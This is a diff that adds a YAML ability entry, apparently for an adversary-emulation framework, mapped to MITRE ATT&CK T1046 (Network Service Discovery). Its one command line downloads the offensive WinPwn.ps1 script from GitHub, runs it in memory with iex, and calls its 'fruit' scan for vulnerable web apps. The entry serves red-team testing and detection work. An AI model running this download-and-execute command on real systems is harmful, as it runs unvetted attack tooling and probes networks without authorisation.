@@ -1,0 +1,19 @@
+- description: Search for potentially vulnerable web apps (low hanging fruits) using
+    fruit function of WinPwn
+  id: 01f95fd0213aeb1eb07fca8dc548f5ce
+  name: WinPwn - fruit
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';
+          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          fruit -noninteractive -consoleoutput
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: discovery
+  technique:
+    attack_id: T1046
+    name: Network Service Discovery
